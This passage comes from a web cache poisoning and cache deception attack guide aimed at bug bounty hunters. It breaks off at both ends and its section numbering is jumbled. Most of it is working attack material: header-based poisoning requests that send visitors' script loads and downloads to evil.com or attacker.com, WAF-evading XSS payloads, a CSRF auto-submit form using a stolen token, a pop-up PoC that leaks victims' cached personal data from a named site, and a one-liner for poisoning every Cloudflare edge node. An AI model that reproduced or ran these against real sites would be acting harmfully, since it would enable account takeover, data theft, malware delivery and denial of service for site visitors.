- **Wrong:** Cache → WAF → Origin (WAF-generated error pages get cached)

**5. Cache-specific settings:**
- CloudFront: Disable error page caching in distribution settings
- Akamai: Configure "Cache Error Responses" behavior
- Varnish: Use `beresp.uncacheable` for error responses
  <input name="CSRFToken" value="STOLEN">
  <input name="fname" value='"xss","a":top[8680439..toString(30)](document.domain),//'>
  <input name="lname" value="attacker">
  <input name="zipcode" value="00000">
  <input name="dobField" value="01/01/1990">
</form>
<script>document.forms[0].submit()</script>
```

**Dual ATO routes:**
1. **Session hijack:** Steal session token → change victim email → password reset to attacker-controlled email
2. **Keylogger:** JavaScript payload fires on various screens, capturing keystrokes including passwords

### 5.6 Persistent Redirect Hijacking & Nested Cache Poisoning
Some frameworks allow arbitrary redirect destination override via query parameters, but only on redirect responses. Using path-override unkeyed inputs, you can force *any* page to return a redirect.

**Drupal + Symfony `destination` open redirect:**
```
GET //?destination=https://evil.net\@target.com/ HTTP/1.1
Host: target.com
```
- Drupal sees `//` and issues a redirect to `/` to normalize
- `destination` parameter overrides the redirect target
- Drupal thinks the destination is a local path with username `evil.net\`, but browsers normalize `\` → `/`
- Result: `Location: https://evil.net/@target.com/` (browser resolves to `evil.net`)

**Cache-abuse escalation:**
Certain pages import JS via a redirect:
```
GET /foo.js?v=1 HTTP/1.1
Host: business.target.com
X-Original-URL: /foo.js?v=1
```
Normal response is a redirect:
```
HTTP/1.1 302 Found
Location: /static/foo.abc123.js
```

Poison the redirect destination:
```
GET /?destination=https://evil.net\@business.target.com/ HTTP/1.1
Host: business.target.com
X-Original-URL: /foo.js?v=1
```
- Cache key: `/foo.js?v=1`
- Origin returns 302 to `https://evil.net/@business.target.com/`
- CDN caches the 302 under the JS file key
- All visitors load attacker-controlled JS

### 5.7 Nested Cache Poisoning (Internal → External)
Targets using both internal caches (e.g., Drupal) and external CDNs/Varnish can be chained for maximum impact.

**Two-stage attack:**
1. Stage 1 — Poison the **internal cache** to turn `/redir` into a malicious redirect:
```
GET / HTTP/1.1
Host: store.target.com
X-Original-URL: /redir
X-Forwarded-Host: evil.com
```
- Internal Drupal cache now serves `/redir` as a redirect to `evil.com`

2. Stage 2 — Poison the **external cache** to replace `/download?v=1` with `/redir`:
```
GET /download?v=1 HTTP/1.1
Host: store.target.com
X-Original-URL: /redir
```
- External CDN cache key: `/download?v=1`
- Origin serves the pre-poisoned `/redir` → 302 to `evil.com`
- CDN caches the redirect under `/download?v=1`
- **Result:** Clicking "Download" downloads malware from evil.com

**Other escalations via this chain:**
- Spoof RSS feed entries
- Replace login pages with phishing pages
- Stored XSS via dynamic script imports served from `/redir`

---

## 6. ARBITRARY CACHE POISONING KEY MANIPULATION

### 6.1 Mapping Discrepancies (Origin Doesn't Normalize)
```
GET /hello/..%2f/home HTTP/1.1
```
- Cache normalizes to `/home`
- Origin does not normalize; path becomes `/hello/..%2f/home`
- If this non-existent endpoint reflects path in cacheable 404 response, poison `/home` key

### 6.2 Backend Delimiter Key Control
```
Payload: /backend-path + delimiter + traversal + poisoned-path
Example: /profile;/../home
```
- Delimiter prevents origin from resolving traversal
- Cache includes suffix in key (delimiter not recognized)
- Result: Executes `/profile`, but stores under `/home` key

### 6.4 Backslash Normalization Discrepancy (Shopify Case — #1695604)
**Attack:** CDN normalizes backslash (`\`) to forward slash (`/`) in cache key, but origin does **not**.

```
GET /admin\dashboard HTTP/1.1
Host: shop.shopify.com
```
- **Cache key** → `/admin/dashboard` (normalized)
- **Origin path** → `/admin\dashboard` → returns `404 Not Found`
- Cache stores 404 under `/admin/dashboard`
- Legitimate users requesting `/admin/dashboard` receive poisoned error
- **Impact:** Denial of Service on any cached path

**Generalization:** Test any non-standard path separator (`\`, `%5C`, encoded variants) to find normalization gaps.

### 6.3 Frontend Delimiter Key Control
```
Payload: poisoned-path + frontend-delimiter + traversal + backend-path
Example: /evil#/../../home
```
- Microsoft Azure treats `#` as delimiter and normalizes key
- Request to `/evil#/../../home` stores under `/home` key
- Forwarded suffix after delimiter reaches origin as separate parameter/context

### 6.5 URL Fragment Discrepancy (Apache Traffic Server — CVE-2021-27577)
Apache Traffic Server (ATS) generates cache keys from host, path, and query, but **forwards the URL fragment** to the origin without stripping it. Per RFC 7230, the origin-form should contain only absolute-path and query, making these forwarded requests invalid.

If backend proxies encode `#` to `%23`, the origin sees a completely different path while the cache key remains unchanged.

**Attack — Direct fragment poisoning:**
```
GET /index.html#/../admin HTTP/1.1
Host: target.com
```
- Cache key: `/index.html`
- Origin receives: `/index.html#/../admin` → proxies encode `#` → `/index.html%23/../admin`
- If origin normalizes `/../`, response for `/admin` is cached under `/index.html`
- All visitors to `/index.html` receive the `/admin` response

**Attack — Fragment + traversal to arbitrary path:**
```
GET /static/main.js#/../../../../etc/passwd HTTP/1.1
```
- Cache key: `/static/main.js`
- Origin processes the fragment as part of the path
- Allows caching arbitrary responses under benign static keys

**Affected stacks:** ATS is used by Yahoo, Apple, and others. Verify via `Server` headers or known ATS fingerprints.

---

## 7. INFORMATION LEAKAGE AIDING ATTACKS

### 7.1 Cache-Control Directives
```
Age: 174
Cache-Control: public, max-age=1800
```
Reveals exactly when to send payload. Calculate window: `max-age - Age` = time remaining before cache expires.

### 7.2 Vary Header Analysis
```
Vary: User-Agent
```
Informs attacker that `User-Agent` is keyed. Enables:
- Targeted attacks against specific browsers/software
- Selection of most common UA for maximum impact

### 7.3 Multi-Edge Cache Poisoning & CF-RAY Analysis (Cross-Cloud Poisoning)

**Critical concept:** Not all CDN users connect to the same cache. CDNs like Cloudflare operate hundreds of regional edge nodes worldwide. Poisoning one edge does **not** poison all edges.

**CF-RAY header analysis:**
```
Cf-Ray: 6498c2c958e89cee-AMS
```
- `AMS` = Amsterdam (IATA airport code)
- Each `CF-RAY` value reveals which edge node served the response
- Colleagues in different regions hit different caches and may not be affected

**Enumerating Cloudflare edge caches (one-liner):**
```bash
curl https://www.cloudflare.com/ips-v4 | sudo zmap -p80 | zgrab --port 80 --data traceReq | fgrep visit_scheme | jq -c '[.ip , .data.read]' | sed -E 's/\["([0-9.]*")".*colo=([A-Z]+).*/\1 \2/' | awk -F " " '!x[$2]++'
```
This script:
1. Fetches all Cloudflare IPv4 ranges
2. Scans port 80 across all IPs
3. Extracts which cache location (`colo`) each IP belongs to
4. Returns unique edge locations with sample IPs

**Example edge locations accessible from Manchester, UK:**
| IP | Location Code |
|----|---------------|
| 104.28.19.112 | LHR (London Heathrow) |
| 172.64.47.124 | DME (Moscow Domodedovo) |
| 172.64.9.230 | IAD (Washington Dulles) |
| 172.64.13.163 | EWR (Newark) |
| 172.64.32.99 | SIN (Singapore) |
| 198.41.238.27 | AKL (Auckland) |
| 198.41.212.78 | AMS (Amsterdam) |
| 108.162.253.199 | MSP (Minneapolis) |
| 162.158.145.197 | YVR (Vancouver) |

**Impact on testing:**
- **Triage rejection risk:** A triager in the USA may not reproduce a poison you created in Europe
- **Global impact requires multi-edge poisoning:** To truly deny service globally, you must poison every edge that serves your target's traffic
- **CVSS complexity should NOT increase:** James Kettle (albinowax) established in "Practical Web Cache Poisoning" that iterating through CDN IPs and poisoning multiple caches is trivially automated

**Testing methodology for multi-edge:**
1. [ ] Note `CF-RAY` value from your initial poison request
2. [ ] Test via VPN in different regions (US, EU, Asia) and compare `CF-RAY` codes
3. [ ] If different edges are unpoisoned, demonstrate the one-liner script capability
4. [ ] In report, state: "While only demonstrated on [LOCATION], Cloudflare publishes all IPs online and poisoning all edges is a one-line job"
5. [ ] Reference: "Practical Web Cache Poisoning — Cross-Cloud Poisoning section" (James Kettle)

**For other CDNs:**
- **Akamai:** Look for `Akamai-Edge` or `Akamai-Request-BC` headers
- **Fastly:** `Fastly-Debug` header reveals edge information
- **CloudFront:** `X-Amz-Cf-Pop` reveals edge PoP (Point of Presence)

---

## 8. TOOLING

### 8.1 Essential Tools
- **Burp Suite Professional/Community** + **Param Miner** extension (automated unkeyed input discovery)
- **Burp Scanner** (automatic path mapping discrepancy detection)
- **Web Cache Deception Scanner** BApp
- **Burp Comparer** (manual response comparison)
- **Burp Intruder** (delimiter fuzzing)

**Param Miner — Core Features for Cache Attacks:**
Param Miner is an open source Burp Suite extension that works with both Community and Pro editions. Its cache-focused features include:

1. **Cache busters** — Use the "Add cachebuster" option to add static or dynamic **header-based cache busters** to all traffic. This helps unmask dynamic pages disguised as static by query-string exclusion, while reducing the chance of accidentally affecting other users. Select "Add static cachebuster" and "Include cachebusters in headers" to enable it for all Burp Suite traffic.

2. **Fat GET detection** — Param Miner can scan for Fat GET vulnerabilities where the cache ignores the request body. A video demonstration on the Param Miner GitHub repo shows it detecting this issue on a system running Rack::Cache.

3. **Cache-key issue scanning** — Param Miner automatically probes discovered unkeyed parameters to identify whether they're included in the cache key. Enable the *"twitchy cache poison"* option to increase sensitivity for detecting subtle cache poisoning vectors (e.g., error-response poisoning via malformed headers).

4. **Unkeyed input discovery** — The extension's core function is finding unlinked headers and parameters by brute-forcing a consolidated wordlist.

**Merged header wordlist (2,917 headers):**
iustin24 combined Param Miner's list with HTTP Archive `Vary` header values via Google BigQuery. Use this to expand unkeyed header brute-forcing beyond the common set.
- https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6

**PortSwigger Web Security Academy Labs:**
Free online labs are available for practicing cache poisoning, cache deception, exploiting cache design flaws, and exploiting cache implementation flaws. Use these to gain hands-on experience identifying and exploiting cache-key transformations before testing live targets.

### 8.2 Cache Busting Strategy
Always use unique cache busters during testing:
```
?utm_content=UNIQUE_ID
Accept-Encoding: gzip, deflate, UNIQUE_ID
```

Param Miner can auto-generate cache busters to prevent accidentally poisoning live traffic.

### 8.3 Detection Checklist
- [ ] Identify all `X-Cache` or equivalent response headers
- [ ] Confirm cache hit vs miss behavior with timing
- [ ] Extract cache key if possible (`Pragma: akamai-x-get-cache-key`)
- [ ] Identify cache rules (extensions, directories, files)
- [ ] Determine origin framework (for delimiter knowledge)
- [ ] Test path normalization on both cache and origin
- [ ] Map unkeyed inputs (headers, cookies, body, query params)
- [ ] Identify dangerous gadgets (reflection points, redirects, imports)
- [ ] **Check CF-RAY / edge headers and test multi-edge poisoning**
- [ ] Verify impact across multiple CDN edge locations (VPN / direct IP)

### 8.4 Common Pitfalls & Reproducibility
**"Works in Burp, not in browser" — The most common failure mode:**

Cache poisoning reproduced via Burp Repeater but not in an unproxied browser usually means the **cache keys differ** between your two requests.

**Most frequent causes:**

1. **Param Miner's static cachebuster (`?cb=1`)**
   - If Param Miner injects `?cb=1` into all outbound Burp requests, the cache key in Burp is different from the browser's.
   - **Fix:** Disable "Add fcbz cachebuster" or ensure your browser request contains the same buster.

2. **Burp "Remove unsupported encodings" option**
   - Burp's Proxy > Options > "Remove unsupported encodings" rewrites `Accept-Encoding`.
   - If the cache keys on `Accept-Encoding`, your Burp request key will differ from the browser's.
   - **Fix:** Disable the encoding rewrite, or ensure both requests have identical `Accept-Encoding` values.

3. **Truncated fragments**
   - Browsers drop `#fragment` from the request before sending it to the server.
   - If you use a fragment intentionally (e.g., `#/../admin` for ATS), it will not work in a standard browser request line.
   - **Fix:** Test with encoded fragments (`%23`) or use a proxy to manually construct the request.

4. **Cookie differences**
   - Your browser may send session cookies that change the cache key (e.g., Cloudflare caches differently for authenticated users).
   - **Fix:** Test both authenticated and unauthenticated states; compare request headers line-by-line.

5. **Cloudflare edge routing**
   - Your Burp request and browser request may hit different Cloudflare edge nodes (different CF-RAY codes).
   - **Fix:** Test via direct IP targeting, VPN, or confirm CF-RAY matches.

**Always compare requests:**
Use Logger++ to capture the exact request sent by your browser, then compare byte-for-byte with the Burp Repeater request.

---

## 9. REAL-WORLD CASE STUDIES

### 9.1 HackerOne #1695604 — Shopify: Backslash DoS ($?)
- **Technique:** Backslash normalization discrepancy
- **Payload:** `GET /admin\dashboard`
- **Root cause:** CDN normalized `\` → `/` in cache key; origin did not
- **Impact:** 404 cached under legitimate path → DoS

### 9.2 HackerOne #1160407 — GitLab: Method Override DoS via GCP + Varnish ($?)
- **Technique:** `X-HTTP-Method-Override: HEAD` on static assets hosted on GCP, cached by Varnish
- **Target:** `assets.gitlab-static.net` (GCP-backed, Varnish-cached)
- **Payload:**
  ```
  GET /assets/webpack/commons-pages.admin.sessions-...chunk.js?cb=youstin-xyz HTTP/1.1
  Host: assets.gitlab-static.net
  x-http-method-override: HEAD
  ```
- **Root cause:**
  1. Google Cloud Storage (GCP) honored `X-HTTP-Method-Override: HEAD`
  2. Varnish cache did **not** include the `X-HTTP-Method-Override` header in the cache key
  3. Varnish cached the HEAD response (empty body, `Content-Length: 0`) under the GET key
  4. All subsequent GET requests received the empty cached response

**Cache headers confirming Varnish:**
```
Via: 1.1 varnish, 1.1 varnish
X-Served-By: cache-dca17752-DCA, cache-osl6520-OSL
X-Cache: HIT, HIT
X-Cache-Hits: 1, 1
Age: 498
```

**GCP-specific headers:**
```
Server: UploadServer
x-goog-stored-content-encoding: identity
x-goog-storage-class: MULTI_REGIONAL
x-goog-meta-goog-served-file-mtime: 1617986774
```

**Critical extra vector — PURGE method unblocked:**
GitLab did not block the `PURGE` HTTP method. This means:
1. Attacker sends `PURGE` to clear the legitimate cache entry
2. Immediately sends `GET + X-HTTP-Method-Override: HEAD` to poison with empty body
3. All users now receive the empty response for that JS/CSS file
4. **Impact:** GitLab becomes completely unusable (missing JS/CSS)

**Responsible disclosure technique — cache busters:**
The reporter used `?cb=youstin-xyz` as a cache buster to prove the vulnerability without affecting live users. This is the standard "dontpoisoneveryone" parameter technique from James Kettle's "Practical Web Cache Poisoning."

**Triage pushback & response:**
- **Analyst:** "I am never shown the poisoned version of the cache"
- **Reporter response:** Demonstrated the cache-busted URL showed empty response; explained that removing the cache buster would poison the live file; noted PURGE makes it reproducible on already-cached live resources
- **Key lesson:** Always use cache busters during testing, but clearly explain how removing them makes the attack live

**Impact:** Denial of Service on all GitLab instances using the CDN for JS/CSS files.

### 9.3 HackerOne #1181946 — HackerOne Self: Redirect Loop DoS ($)
- **Technique:** `X-Forwarded-Scheme: http` on static assets
- **Payload:** `GET /assets/js/app.js?hackerone=poc` + `X-Forwarded-Scheme: http`
- **Root cause:** Rack prioritized `X-Forwarded-Scheme` over `X-Forwarded-Proto`; Cloudflare cached 301
- **Impact:** Redirect loop poisoned all static asset requests

### 9.4 HackerOne #631589 — Lyst: User Data Disclosure via WCD
- **Technique:** Web Cache Deception via `.css` on dynamic endpoint
- **Payload:** `GET /shop/trends/mens-dress-shoes/blahblah.css`
- **Root cause:** No content-type validation; cache stored HTML response as CSS
- **Impact:** Authenticated users' personal data served to unauthenticated visitors

**Full Attack Flow:**
1. Attacker crafts URL with `.css` extension appended to a dynamic endpoint that returns personalized content
2. Victim (logged in) visits `https://www.lyst.com/shop/trends/mens-dress-shoes/blahblah.css`
3. Lyst origin serves the dynamic page with victim's session data (email, username, slug, member ID)
4. CDN/cache sees `.css` extension → stores the response
5. Attacker visits same URL in incognito/private mode
6. Attacker receives cached response containing victim's personal information

**Automated PoC Script (deksterh11):**
```html
<html>
<head></head>
<body>
<script>
   var cachedUrl = 'https://www.lyst.com/' + generateId() + '.css';
   const popup = window.open(cachedUrl);

   function generateId() {
       var content = '';
       const alphaWithNumber = 'QWERTZUIOPASDFGHJUKLYXCVBNM1234567890';
       for (var i = 0; i < 10; i++) {
           content += alphaWithNumber.charAt(Math.floor(Math.random() * alphaWithNumber.length))
       }
       return content;
   }

   var checker = setInterval(function() {
       if (popup.closed) { clearInterval(checker); }
   }, 200);
   var closer = setInterval(function() {
       popup.close();
       document.body.innerHTML = 'Victims content is now cached <a href="' + cachedUrl + '">here</a><br><b>Full Url: ' + cachedUrl + '</b>';
       clearInterval(closer);
   }, 3000);
</script>
</body>
</html>
```

**How the PoC works:**
1. Generates a random 10-character alphanumeric string + `.css`
2. Opens it in a popup window (victim's browser, logged-in session)
3. Waits 3 seconds for CDN to cache the authenticated response
4. Closes popup and displays the cached URL to the attacker
5. Attacker can then fetch the URL and view source to extract victim data

**Data leaked:**
- Username
- User slug
- Member ID
- Email address
- Login session state (appears "logged in" to unauthenticated requester)

**Key insight:** The dynamic endpoint returned `text/html` but the cache keyed on `.css` extension without validating `Content-Type`. Any suffix appended to a valid path could trigger this behavior.

**Reference:** [Black Hat USA 2017 — Omer Gil, "Web Cache Deception Attack"](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

### 9.5 HackerOne #3183046 — Omise: Cache Pollution via UTM ($)
- **Technique:** Unkeyed GET parameter pollution
- **Payload:** `GET /page?utm_content="><script>alert(1)</script>`
- **Root cause:** UTM parameters excluded from cache key but reflected in response
- **Impact:** Stored XSS on high-traffic pages

### 9.6 InfosecWriteups — $6,300 Cache Poisoning to Stored XSS
- **Technique:** Referer header reflection + cache poisoning
- **Payload:** `Referer: ?</script><svg/onload=eval/**/(atob/**/(this.id)) id=BASE64>`
- **Key insight:** Found URL cached directly without file extensions
- **Impact:** Stored XSS + subdomain cookie leakage (35 fires, 4 subdomains)

### 9.7 bxmbn — $1,500 Cache Deception to Account Takeover
- **Technique:** Cache Deception via `.js` extension on dynamic endpoint
- **Payload:** `GET https://host.com/app/conversation/1.js`
- **Root cause:** All cookies (including `HttpOnly`) disclosed in dynamic response; cache stored response under `.js` key
- **Mechanism:**
  1. Authenticated user visits poisoned URL → response cached with their session cookies
  2. Attacker fetches same URL unauthenticated → receives victim's cookies
  3. Session hijacking → full account takeover
- **TTL note:** 404 responses cached ~10 seconds (attacker must be quick); 200 OK cached ~24 hours (much more reliable)
- **Tip:** Add semicolon before extension if direct extension gives 404: `/xxxx/xxxxxx/;.js`

### 9.8 bxmbn — $1,000 Cache Poisoning to DoS (Akamai)
- **Technique:** Backslash as header name → cached 400 Bad Request
- **Payload:**
  ```
  GET /products/xxx/xxxx/xxx/?test HTTP/2
  Host: www.host.com
  \\: 
  ```
- **Root cause:** Akamai cached `400 Bad Request` response covering wildcard paths (`/products/*`, `/*`)
- **Impact:** Global DoS — any user visiting poisoned path receives 400 error
- **Akamai workaround:** 400 responses now limited to ~5 seconds in cache
- **Attacker countermeasure:** Send null payloads via Burp Intruder to continuously refresh the poisoned cache entry
- **Response indicators:**
  ```
  Server-Timing: cdn-cache; desc=HIT
  Server-Timing: edge; dur=32
  Server-Timing: origin; dur=147
  ```

### 9.9 James Kettle — Red Hat: Open Graph Meta Tag XSS via X-Forwarded-Host
- **Technique:** Basic cache poisoning via `X-Forwarded-Host` reflecting into Open Graph URL
- **Payload:**
  ```
  GET /en?dontpoisoneveryone=1 HTTP/1.1
  Host: www.redhat.com
  X-Forwarded-Host: a."><script>alert(1)</script>
  ```
- **Root cause:** Application used `X-Forwarded-Host` to generate `og:image` meta tag; Akamai cached the response despite `Cache-Control: public, no-cache`
- **Impact:** Stored XSS on homepage for all visitors
- **Key lesson:** `Cache-Control: no-cache` does not prevent caching — never assume a page is uncacheable without testing

### 9.10 James Kettle — Unity: Discreet Poisoning via Timing Precision
- **Technique:** `X-Host` unkeyed header used to replace script import URL
- **Payload:**
  ```
  GET / HTTP/1.1
  Host: unity3d.com
  X-Host: portswigger-labs.net
  ```
- **Root cause:** Application used `X-Host` to build `<script src="...">` URL; Varnish cached the response
- **Impact:** All visitors loaded attacker-controlled JavaScript
- **Timing advantage:** `Age: 174` + `Cache-Control: public, max-age=1800` told attacker exactly when cache would expire (`1800 - 174 = 1626` seconds), enabling a single precisely-timed poison request instead of traffic-heavy barrage

### 9.11 James Kettle — Unnamed Fastly Target: Selective Poisoning via Vary
- **Technique:** `X-Forwarded-Host` XSS constrained by `Vary: User-Agent`
- **Payload:**
  ```
  GET / HTTP/1.1
  Host: redacted.com
  X-Forwarded-Host: a"><iframe onload=alert(1)>
  ```
- **Root cause:** `Vary: User-Agent, Accept-Encoding` meant the poison was only served to users with the **exact same User-Agent string**
- **Impact:** Targeted attacks against specific browsers or individuals possible; alternatively, cycle through popular UAs for mass coverage
- **Key lesson:** `Vary` headers reveal cache key composition and enable both selective targeting and concealment from security monitoring

### 9.12 James Kettle — data.gov: DOM-Based Translation File Poisoning
- **Technique:** `X-Forwarded-Host` controlled frontend `data-site-root` attribute, which loaded JSON translations
- **Discovery method:** Burp match/replace rule injecting `X-Forwarded-Host: burpcollaborator.net` across all requests, then normal browsing to identify unexpected outbound requests
- **Payload (translation file):**
  ```json
  {"Show more": "<svg onload=alert(1)>"}
  ```
- **Root cause:** Frontend JavaScript used `data-site-root` to construct API calls; loaded translation data was inserted into DOM without sanitization
- **Impact:** Stored XSS — any page containing the text "Show more" executed the payload

### 9.13 James Kettle — Mozilla SHIELD Hijacking ($1,000)
- **Technique:** `X-Forwarded-Host` poisoned Mozilla's recipe delivery system used by Firefox SHIELD
- **Payload:**
  ```
  GET /api/v1/ HTTP/1.1
  Host: normandy.cdn.mozilla.net
  X-Forwarded-Host: xyz.burpcollaborator.net
  ```
- **Root cause:** NGINX cached the poisoned response containing attacker-controlled recipe URLs; Firefox fetched recipes shortly after startup and periodically refreshed
- **Impact:** Potential mass DDoS, replay of old signed/unsigned recipes, or foothold in backend infrastructure via unsigned recipe channels
- **Timeline:** Patched by Mozilla within 24 hours

### 9.14 James Kettle — GoodHire (HubSpot): Route Poisoning via X-Forwarded-Server
- **Technique:** `X-Forwarded-Server` header caused HubSpot to route to wrong tenant
- **Payload:**
  ```
  GET / HTTP/1.1
  Host: www.goodhire.com
  X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com
  ```
- **Root cause:** HubSpot trusted `X-Forwarded-Host` / `X-Forwarded-Server` over `Host` for routing; Cloudflare cached the wrong tenant's content under `www.goodhire.com`
- **Impact:** Stored XSS on victim SaaS site by caching attacker's HubSpot tenant page
- **Key lesson:** SaaS platforms handling multi-tenant routing are especially prone to internal misrouting via unkeyed headers

### 9.15 James Kettle — Cloudflare Blog (Ghost): Hidden Route Poisoning + Mixed-Content Bypass
- **Technique:** `X-Forwarded-Host` caused Ghost to redirect to attacker's custom domain
- **Payload:**
  ```
  GET / HTTP/1.1
  Host: blog.cloudflare.com
  X-Forwarded-Host: attacker.ghost.io
  ```
- **Root cause:** Ghost used `X-Forwarded-Host` to look up the custom domain for a blog; if found, issued a 302 redirect. However, the redirect used HTTP, so mixed-content protections blocked JS/CSS loads in Chrome/Firefox.
- **Bypasses:**
  - **Safari:** If attacker domain was in browser's HSTS cache, redirect auto-upgraded to HTTPS
  - **Edge:** 302 redirect to HTTPS URL bypassed Edge's mixed-content protection entirely
- **Impact:** Full page compromise on blog.cloudflare.com and all Ghost clients for Safari/Edge users; image hijacking for Chrome/Firefox users

### 9.16 James Kettle — Unnamed Target: Chaining Unkeyed Inputs (CSRF + Redirect)
- **Technique:** Combined `X-Forwarded-Host` + `X-Forwarded-Scheme` to produce arbitrary redirect
- **Payload:**
  ```
  GET /en HTTP/1.1
  Host: redacted.net
  X-Forwarded-Host: attacker.com
  X-Forwarded-Scheme: nothttps
  ```
- **Root cause:**
  - `X-Forwarded-Scheme: nothttps` → origin issues 301 redirect to HTTPS version
  - `X-Forwarded-Host: attacker.com` → origin uses attacker domain in redirect destination
  - Combined: `Location: https://attacker.com/en`
- **Impact:**
  - Steal custom HTTP headers (including CSRF tokens) by redirecting POST requests cross-origin
  - Obtain stored DOM-based XSS by redirecting JSON loads to attacker-controlled responses
- **Key lesson:** Individual unkeyed inputs may be harmless alone; chaining them produces fully exploitable results

### 9.17 James Kettle — Unnamed Target: Open Graph Social Media Hijacking
- **Technique:** `X-Forwarded-Host` poisoned `og:url` meta tag
- **Payload:**
  ```
  GET /popularPage HTTP/1.1
  Host: redacted.net
  Cookie: session_id=942...
  X-Forwarded-Host: attacker.com
  ```
- **Root cause:** Page used `X-Forwarded-Host` to generate `og:url`; Cloudflare only cached when session cookie was present, bypassing `Cache-Control: private` for auth-backed traffic
- **Impact:** Anyone sharing the poisoned page on Facebook/Twitter would share attacker-controlled content
- **Workaround note:** Cloudflare's cache documentation revealed that pages with `Cache-Control: private` may still cache if the request contains a session cookie, depending on configuration

### 9.18 James Kettle — Unity for Education: Local Route Poisoning via X-Original-URL
- **Technique:** `X-Original-URL` / `X-Rewrite-URL` overridden the request path inside Symfony/Drupal
- **Payload:**
  ```
  GET /education?x=y HTTP/1.1
  Host: store.unity.com
  X-Original-URL: /gambling?x=y
  ```
- **Root cause:** Cache key formed from visible path (`/education`), but origin used `X-Original-URL` to determine actual content → served gambling page
- **Impact:** Page-swapping for defacement, phishing, or reputation damage
- **Generalization:** `X-Original-URL` and `X-Rewrite-URL` are supported by Symfony, Drupal, Zend, and any PHP application built on these frameworks — massive attack surface

### 9.19 James Kettle — Pinterest: Persistent Redirect Hijacking + Nested Cache Poisoning
- **Technique:** Combined Drupal `destination` open redirect with `X-Original-URL` path override
- **Payload (Stage 1 — internal cache):**
  ```
  GET / HTTP/1.1
  Host: store.unity.com
  X-Original-URL: /redir
  X-Forwarded-Host: evil.com
  ```
- **Payload (Stage 2 — external cache):**
  ```
  GET /download?v=1 HTTP/1.1
  Host: store.unity.com
  X-Original-URL: /redir
  ```
- **Root cause:**
  1. Stage 1 poisoned internal Drupal cache so `/redir` served a redirect to `evil.com`
  2. Stage 2 poisoned external CDN so `/download?v=1` served the pre-poisoned `/redir`
- **Impact:** Clicking "Download" downloaded malware from attacker's domain
- **Reference:** Drupal patched this via SA-CORE-2018-005, CVE-2018-14773, ZF2018-01 on 2018-08-01

### 9.10 bxmbn — $1,000 Cache Poisoning to Stored XSS (jQuery $.getScript)
- **Technique:** Cookie-based XSS + cache poisoning via `.otf` extension
- **Payload:**
  ```
  GET /xxxx/xx-xx.otf?triagethiss HTTP/2
  Host: www.host.com
  Cookie: n_vis=xssx'*$.getScript`//593.xss.ht`//;
  ```
- **Root cause:** `n_vis` cookie value reflected inside `<script>` block without sanitization; response cached
- **WAF bypass:** Strong WAF blocked conventional XSS strings, but jQuery `$.getScript` with backtick syntax evaded filters
- **Reflection context:**
  ```javascript
  <script>
  Visitor.id='xssx'*$.getScript`//593.xss.ht`//;
  </script>
  ```
- **Impact:** Stored XSS — all visitors to poisoned cached resource execute attacker-controlled script
- **Key tip:** Test XSS on **every** request header, cookie, custom header, and `X-Forwarded-*` header

### 9.9 InfosecWriteups — Multi-Header WAF Bypass + Cache Poisoning to Stored XSS
- **Technique:** Cookie injection + IP reflection + multiple `X-Forwarded-For` headers
- **WAF bypass:** WAF triggered on `<[anything]` after `%20`; attacker split payload across 3 `X-Forwarded-For` headers
- **Payload chain:**
  ```
  Cookie: gdId=xss</script%20
  X-Forwarded-For: xss
  X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
  X-Forwarded-For: >
  ```
- **Obfuscation:** `globalThis[\`al\`+/ert/.source]\`1\`` uses template literals + regex source to evade WAF detection of `alert`
- **Reflection context:**
  ```javascript
  guid="</script ","24.99.19.20","xss","xss><svg/onload=globalThis[`al`+/ert/.source]`1`//,">
  ```
- **Cache trigger:** Appending `.js` to non-cached URL forced caching (`/xxx/xx/xxx.xx/x.js?t=2021111121`)
- **Impact:** Stored XSS on public program; URL hides XSS behind innocuous `.js` extension

### 9.10 bxmbn — Cache Deception → CSRF Theft → Account Takeover ($16,500)
- **Technique:** Self-XSS in profile update + WCD via `.woff2` extension + CSRF token extraction
- **Step 1 — Identify self-XSS:** Profile name update field reflected payload without sanitization
- **Step 2 — Weaponize via cache deception:**
  ```
  GET https://www.target.com/my-account/personal-information.woff2?triagethis
  ```
  - Akamai cached the authenticated response containing the user's CSRF token
  - Attacker fetched same URL unauthenticated → extracted `CSRFToken`
- **Step 3 — Deliver auto-submit CSRF form:**
  ```html
  <html>
  <body onload="xss.submit();">
    <form method="POST"
          action="https://www.target.com/my-account/update-profile"
          id="xss" style="display:none">
      <input type="hidden" name="CSRFToken" value="STOLEN_TOKEN">
      <input type="hidden" name="lname" value="Oauth">
      <input type="hidden" name="zipcode" value="07801">
      <input type="hidden" name="fname"
             value="&#x78;&#x73;&#x73;&#x22;&#x2c;&#x22;&#x61;&#x22;&#x3a;&#x74;&#x6f;&#x70;&#x5b;&#x38;&#x36;&#x38;&#x30;&#x34;&#x33;&#x39;&#x2e;&#x2e;&#x74;&#x6f;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x33;&#x30;&#x29;&#x5d;&#x28;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x6d;&#x61;&#x69;&#x6e;&#x29;&#x2c;&#x2f;&#x2f;">
      <input type="hidden" name="dobField" value="04/06/1994">
    </form>
  </body>
  </html>
  ```
- **Payload obfuscation:** `xss","a":top[8680439..toString(30)](document.domain),//`
  - `8680439..toString(30)` → base-30 converts to `"alert"`
  - `top[...]` → `top.alert`
  - `//` comments out the rest of the JSON structure
  - HTML entity encoding bypasses any front-end validation on the form field
- **Dual ATO routes:**
  1. **Email hijack:** Change victim email → request password reset → takeover account
  2. **Keylogger:** XSS payload fires on multiple pages → captures passwords in real-time
- **Impact:** Full account takeover on public program

### 9.25 James Kettle — Tesla: WAF Block Page Poisoning ($300)
- **Technique:** Trigger cacheable WAF block via unkeyed header
- **Payload:**
  ```
  GET /en_GB/roadster?dontpoisoneveryone=1 HTTP/1.1
  Host: www.tesla.com
  Any-Header: burpcollaborator.net
  ```
- **Root cause:** WAF returned `403 Forbidden` + "Access Denied" when it saw `burpcollaborator.net` in any header; cache key did not include the triggering header
- **Impact:** All subsequent visitors to `/en_GB/roadster` received "Access Denied"

### 9.26 James Kettle — HackerOne: Invalid Port Redirect Timeout ($2,500)
- **Technique:** `X-Forwarded-Port: 123` poisons redirect with invalid port
- **Payload:**
  ```
